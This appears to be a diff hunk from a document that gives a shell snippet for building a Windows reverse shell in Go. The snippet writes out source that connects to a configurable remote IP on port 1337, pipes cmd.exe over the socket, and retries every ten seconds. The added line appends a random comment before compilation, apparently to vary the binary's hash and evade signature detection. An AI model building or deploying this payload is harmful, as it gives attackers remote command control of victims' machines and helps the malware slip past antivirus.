@@ -39,6 +39,7 @@ remote_port="1337"
 
 
 echo "package main;import \"time\";import\"os/exec\";import\"net\";func connect(){c,_:=net.Dial(\"tcp\",\"${remote_ip}:${remote_port}\");cmd:=exec.Command(\"cmd.exe\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}; func main(){for {connect();time.Sleep(10 * time.Second)}}" > /tmp/t.go &&\
+	echo "// $(pwgen -N1 22)" >> /tmp/t.go &&\
 	GOOS="windows" go build -o /tmp/shell.exe /tmp/t.go &&\
 	rm /tmp/t.go
 ```
